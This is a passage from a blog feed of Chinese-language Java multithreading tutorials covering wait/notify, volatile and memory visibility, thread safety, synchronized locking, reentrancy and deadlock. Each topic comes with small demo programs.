class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;t1 wait 之前&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//t1执行到这,就会先立即释放锁,进入wait方法(释放锁+阻塞等待)</span></span><br><span class="line">                        locker.wait();</span><br><span class="line">                        System.out.println(<span class="string">&quot;t1 wait 之后&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//t2执行起来之后,先进行sleep(3000)(这个sleep操作就可以让t1先拿到锁)</span></span><br><span class="line">                    <span class="comment">//如果先notify虽然不会有副作用(不会出现异常之类的),但是wait就无法被唤醒,逻辑上有问题</span></span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                    <span class="comment">//t2sleep结束之后,由于t1是wait状态,t2就能拿到锁</span></span><br><span class="line">                    <span class="comment">//接下来打印t2notify之前,执行notify操作,这个操作就能唤醒t1(此时t1就从WAITING状态恢复过来了)</span></span><br><span class="line">                    <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;t2 notify 之前&quot;</span>);</span><br><span class="line">                        locker.notify();</span><br><span class="line">                        <span class="comment">//但是由于t2此时还没有释放锁,WAITING恢复之后,尝试获取锁,就可能出现一个小小的阻塞,这个阻塞是由锁竞争引起的</span></span><br><span class="line">                        <span class="comment">//t1目前处于BLOCKED状态,但是时间比较短,肉眼看不见</span></span><br><span class="line">                        System.out.println(<span class="string">&quot;t2 notify 之后&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//t2释放锁之后,就可以继续执行t1</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            t1.start();</span><br><span class="line">            t2.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="notifyAll-方法"><a href="#notifyAll-方法" class="headerlink" title="notifyAll()方法"></a>notifyAll()方法</h4><p>顾名思义哈 notifyAll()可以唤醒所有方法&gt;<br><strong>注意</strong><br><strong>唤醒的这些方法在等待(wait)返回时重新获取锁产生锁竞争，但实际这些锁是串行执行的【锁被哪个线程先获取是不确定的】</strong></p><h6 id="区别notify-和notifyAll"><a href="#区别notify-和notifyAll" class="headerlink" title="区别notify()和notifyAll()"></a>区别notify()和notifyAll()</h6><p>1.唤醒一个&#x2F;都唤醒<br>2.没有锁竞争&#x2F;产生锁竞争<br><strong>对比可发现notify()比notifyAll()好控制 发生错误的概率更低</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x4_</title>
      <link href="/2024/09/07/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%9B%9B%E2%80%94%E2%80%94volatile%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2024/09/07/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%9B%9B%E2%80%94%E2%80%94volatile%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h3 id="多线程篇四——volatile关键字"><a href="#多线程篇四——volatile关键字" class="headerlink" title="多线程篇四——volatile关键字"></a>多线程篇四——volatile关键字</h3><p>如笔者理解有误，欢迎交流指正⭐</p><p>首先我们要明晰的一点是<strong>计算机运行程序或代码时经常要访问数据，这些依赖的数据往往存储在内存中.</strong><br><strong><u>CPU使用变量的时候需要先从内存中读取出来放到CPU的寄存器中</u></strong>|由此我们可得读内存比读硬盘快，读寄存器比读内存快，但是CPU一旦涉及读&#x2F;写内存速率很低.此时我们聪明得编译器就会帮忙了（虽然有时候会帮倒忙) 编译器可能会对代码做出优化，减少读内存的次数。提高整体的效率.</p><h4 id="volatile能保证内存可见性"><a href="#volatile能保证内存可见性" class="headerlink" title="volatile能保证内存可见性"></a>volatile能保证内存可见性</h4><p>上代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo14</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">flg</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span>(flg == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//啥也没有</span></span><br><span class="line">            &#125;</span><br><span class="line">             System.out.println(<span class="string">&quot;game over!&quot;</span>)</span><br><span class="line">         &#125;);</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt; &#123;</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">                flg = sc.nextInt();</span><br><span class="line">        &#125;);</span><br><span class="line">            t1.start();</span><br><span class="line">            t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行发现<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/04badabdd5665a1a271fea327c4a8cb7.png" alt="img"><br>当我输入6的时候，并没有输出”game over!” 按理来说修改flg的值不为0的时候会输出”game over!”为什么会出现异常呢？<br>这就是我们的<strong>内存可见性问题</strong>.<br>读取flg的值这个过程分为两步走.</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.load读取内存中的flg值到寄存器中.</span><br><span class="line"><span class="number">2</span>.通过cmp指令比较器比较缓存器的值是否为<span class="number">0</span>，再决定是否要进入循环.</span><br></pre></td></tr></table></figure><p>乍一看这么处理不也没什么问题。但是，while循环此时飞速运转<strong>短时间</strong>内会进行<strong>大量重复</strong>的操作，这样就出现了最开头介绍的小聪明编译器.big 胆就水灵灵优化上了😀<br><strong>只在第一次循环的时候读内存后续直接从寄存器中取出数据</strong><br><u>由于修改flg是t2线程非t1线程本身，编译器没有正确的判定（提高效率不保证逻辑不变哈）以为flg未被修改就直接启动优化了，t1感受不到修改过后的flg的内存变化</u><br>如何避免小聪明不要帮倒忙？这就需要聪明的你使用volatile关键字提醒编译器.【强制爱读取内存】<br><strong>被volatile修饰的变量的的读写操作相关指令,是不可以重排序的.</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo14</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">flg</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span>(flg == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//啥也没有</span></span><br><span class="line">            &#125;</span><br><span class="line">             System.out.println(<span class="string">&quot;game over!&quot;</span>);</span><br><span class="line">         &#125;);</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt; &#123;</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">                flg = sc.nextInt();</span><br><span class="line">        &#125;);</span><br><span class="line">            t1.start();</span><br><span class="line">            t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/04badabdd5665a1a271fea327c4a8cb7.png"></p><p>当然解决内存可见性问题的方法出了从根部抹杀(volatile关键字)还可以规避问题(sleep延缓开销速率 优化也没必要进行了)</p><h4 id="volatile不保证原子性"><a href="#volatile不保证原子性" class="headerlink" title="volatile不保证原子性"></a>volatile不保证原子性</h4><p><strong>volatile 和 synchronized 有着本质的区别. synchronized 能够保证原子性, volatile 保证的是内存可见性.</strong> </p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x3_</title>
      <link href="/2024/09/06/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%89/"/>
      <url>/2024/09/06/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h2 id="多线程篇三"><a href="#多线程篇三" class="headerlink" title="多线程篇三"></a>多线程篇三</h2><h3 id="如笔者理解有误，欢迎交流指正⭐"><a href="#如笔者理解有误，欢迎交流指正⭐" class="headerlink" title="如笔者理解有误，欢迎交流指正⭐"></a><strong>如笔者理解有误，欢迎交流指正⭐</strong></h3><h3 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h3><p><u>划重点！！！</u></p><h4 id="什么是线程安全"><a href="#什么是线程安全" class="headerlink" title="什么是线程安全"></a>什么是线程安全</h4><p>想对线程安全做一个具体清晰的解释很困难，为什么这么说？当然是具体情况具体分析.（就像很多人都喜欢吃面条 有的人喜欢吃炸酱 有的人喜欢吃刀削【其他不具体拓展 因为饿了w】可以具体细分）</p><p>但是！我们可以这样认为 <strong>如果多线程环境下代码运行的结果是符合我们预期的 ，即使在单线程环境应得的结果，则说明这个线程是安全的.</strong></p><h4 id="产生线程安全的原因"><a href="#产生线程安全的原因" class="headerlink" title="产生线程安全的原因"></a>产生线程安全的原因</h4><h5 id="抢占式执行（系统内核）"><a href="#抢占式执行（系统内核）" class="headerlink" title="抢占式执行（系统内核）"></a>抢占式执行（系统内核）</h5><p>上我们熟悉的实例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程安全</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo13</span> &#123;</span><br><span class="line">    <span class="comment">// 此处定义一个 int 类型的变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">locker2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// 对 count 变量进行自增 5w 次</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// 对 count 变量进行自增 5w 次</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        </span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 预期结果应该是 10w</span></span><br><span class="line">        System.out.println(<span class="string">&quot;count: &quot;</span> + count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的预期情况是输出100000 但是实际运行结果如下<br>![img](C:\Users\lenovo\Documents\Tencent Files\3023536144\nt_qq\nt_data\Pic\2024-09\Ori\6060fd35ca0792320d83c150d9658e61.png)<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/6583569de40471cab8baeaa743a94490.png" alt="img"><br>不是预期值且可以发现多次运行的结果并不相同<br>这是为什么？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分代码就是典型的线程安全问题.<br>t1和t2这两个单独的线程在单独执行过程中，毫无疑问没有任何问题.<br>但是t1和t2两个线程并发执行上述循环，会出现逻辑上的问题.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br><span class="line"></span><br><span class="line">t1.join();</span><br><span class="line">t2.join();</span><br></pre></td></tr></table></figure><p>这样是t1和t2同时执行，<strong>多个线程执行上述代码时，由于线程之间的调度顺序是”随机”的，在某些调度顺序下会出现逻辑问题.</strong></p><p>站在CPU的角度上，count++是由CPU的三个指令实现的.<br><strong>1.load 把数据从内存中读取到CPU中</strong><br><strong>2.add 把寄存器中的数据进行+1</strong><br><strong>3.save 把寄存器中的数据保存到内存中</strong><br>在上述3个步骤执行过程中，其实有无数种排列组合的方式.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/8eebd2c9a733557a88b615a436b3f313.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/7f8cc7702ada4c77687645064776fb3e.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/7f8cc7702ada4c77687645064776fb3e.png"><br>上述代码执行完之后发现了bug<br>两个线程本应该是分别自增1次，但2个线程在自增过程中并没有累加而是各自独立运行，故预期得到2，实际只有1.【确实够”随机” 笑】<br><strong>注意 我们得到的”随机值”一定小于100000但也存在小于50000的值（如果t1自增一次的过程中 t2自增多次【如2次】相当于自增了3次 只有一次生效了）</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/f9eb21be4d4d398e98269acd8cb9d911.png" alt="img"><br>怎么样保持t1执行完再执行t2呢？<br>控制t1执行时t2未启动即可.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 线程安全</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo13</span> &#123;</span><br><span class="line">    <span class="comment">// 此处定义一个 int 类型的变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">locker2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// 对 count 变量进行自增 5w 次</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// 对 count 变量进行自增 5w 次</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有这俩 join, 肯定不行的. 线程还没自增完, 就开始打印了. 很可能打印出来的 count 就是个 0</span></span><br><span class="line">        t1.start();</span><br><span class="line">        t1.join();</span><br><span class="line"></span><br><span class="line">        t2.start();</span><br><span class="line">        t2.join();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 预期结果应该是 10w</span></span><br><span class="line">        System.out.println(<span class="string">&quot;count: &quot;</span> + count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="同一个变量被两个线程都修改"><a href="#同一个变量被两个线程都修改" class="headerlink" title="同一个变量被两个线程都修改"></a>同一个变量被两个线程都修改</h5><p>解决方法：</p><p><u>1.一个线程对同一个变量进行修改 ok</u><br><u>2.两个线程针对不同变量进行修改</u><br><u>3.两个线程针对一个变量读取</u></p><h5 id="非原子的修改操作"><a href="#非原子的修改操作" class="headerlink" title="非原子的修改操作"></a>非原子的修改操作</h5><h6 id="什么是原子性"><a href="#什么是原子性" class="headerlink" title="什么是原子性"></a>什么是原子性</h6><p>比如我（线程A）登录一个手游（一段代码），在我未退出游戏时，我们的游戏好友（线程B）也可以登录游戏组队打本.（打断我在游戏中的隐私）<strong>这就是不具备原子性</strong><br>听起来是不是和抢占式很像？真聪明hh<br><strong>如果线程不是“抢占”的就算没有原子性</strong></p><p><strong>一个java语句不一定是原子的，也不一定只是一条指令</strong></p><p>上述count++先进行 了读取再进行修改操作<br><strong>若一段逻辑中存在要根据一定条件决定是否修改也存在类似的问题</strong></p><p>解决方法：想办法让count++一次性被被CPU完成上述3个步骤</p><h5 id="内存可见性问题"><a href="#内存可见性问题" class="headerlink" title="内存可见性问题"></a>内存可见性问题</h5><p>可见性指的是一个线程共享变量值的修改能被其他线程看到<br>Java内存模型（JMM）Java虚拟机规范了Java内存模型<br><strong>目的是屏蔽掉各种硬件和操作系统的内存访问差异 以实现Java程序在各种平台下都能达到一致的并发效果</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/ab40b99fbec360df60d19629d5f8a751.png" alt="img"><br>线程之间共享变量存储在主内存中<br>每一个线程都有自己的”工作内存”<br>当线程要读取一个共享变量的时候 会先把变量从主内存拷贝到工作内存中 再从工作内存读取数据<br>当线程要修改一个共享变量的时候 会先修改工作内存中的副本 再同步回主内存<br>**工作内存像是一个”枢纽” 其实就是CPU的寄存器和高速缓存 **</p><h5 id="指令重排序问题"><a href="#指令重排序问题" class="headerlink" title="指令重排序问题"></a>指令重排序问题</h5><p>比如我们用代码实现<br>1.去茶话弄取餐<br>2.去菜鸟拿快递<br>3.去买曹氏</p><p>如果是在单线程情况下，JVM、CPU指令集会对其进行优化，不止是规规矩矩按1-&gt;2-&gt;3执行，而是可以按1-&gt;3-&gt;2执行(其他顺序也可以)这就叫<strong>指令重排序</strong>.</p><p>如何解决上述问问题呢？<br><strong>简单暴力：加锁！</strong></p><h4 id="解决线程安全问题的方法"><a href="#解决线程安全问题的方法" class="headerlink" title="解决线程安全问题的方法"></a>解决线程安全问题的方法</h4><h5 id="synchronized关键字"><a href="#synchronized关键字" class="headerlink" title="synchronized关键字"></a>synchronized关键字</h5><h6 id="特性一互斥"><a href="#特性一互斥" class="headerlink" title="特性一互斥"></a>特性一互斥</h6><p><strong>synchronized会起到互斥效果，某个线程执行到某个对象的synchronized中时，其他线程如果也执行到同一个对象的synchronized</strong><br>synchronized用的锁存在于Java对象里.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> () &#123;</span><br><span class="line">         count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>()中需要表示一个用来加锁的对象.<strong>对象是什么不重要，只是通过这个对象区分两个线程是都在竞争一个同一个锁</strong></p><p><u><strong>如果两个线程是针对同一个对象加锁 就会出现锁竞争</strong></u><br><u></u><br><strong><u>如果不是争对同一个对象进行加锁就是正常的并发执行</strong></u></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">               <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                   count++;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>这样写两个线程的执行顺序就会相互影响 可以理解为**”并发执行”转变为”串行执行”**(两个线程同时尝试对一个对象加锁，出现锁竞争，一个线程能拿到线程袭击执行，另一个线程只能阻塞等待.等前一个线程释放锁之后，才机会拿到锁继续执行.)<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/8723f06e17a89162e2d1f629149d345f.png" alt="img"></p><h6 id="特性二刷新内存"><a href="#特性二刷新内存" class="headerlink" title="特性二刷新内存"></a>特性二刷新内存</h6><p>synchronized工作过程：<br>1.获得互斥锁<br>2.从主存拷贝变量的最新副本到工作内存中<br>3.执行代码<br>4.将更改后的共享变量的值刷新到主内存<br>5.释放互斥锁</p><p><strong>synchronized也能保存内存可见性</strong>【待考证 扒源码一探究竟😀】</p><h6 id="特性三可重入"><a href="#特性三可重入" class="headerlink" title="特性三可重入"></a>特性三可重入</h6><p>synchronized同步块对同一条线程来说是可重入的，不会出现把自己锁死的情况.（指的就是一个线程连续对一把锁加锁两次不会出现死锁即为”可重入”）<br><strong>让锁记录哪个线程让它被锁住 后续再加锁的时候 如果加锁线程就是持有锁的线程就直接加锁成功</strong><br>比如说你翘课了 刚好老师点名你不在 你就被老师标记了<br>下一次老师点名肯定不会拒绝会再点一次你(无恶意 问就是血泪史)<br>如果换成一个经常坐前排的同学那就不会是这个结果了.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo15</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">            func2();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func2</span><span class="params">()</span> &#123;</span><br><span class="line">        func3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">        func4();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func4</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>tips</strong></p><p>无论有多少层都是要在最外层才能释放锁<br>可以引用计数器来确定有多少层或者记录是否真的释放锁成功(计数器值为0即可)</p><h5 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h5><p><strong>1.一个线程针对一把锁连续加锁两次，如果不是可重入锁，就是死锁.</strong><br>比如把钥匙锁在屋里了进门又需要钥匙就为死锁.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 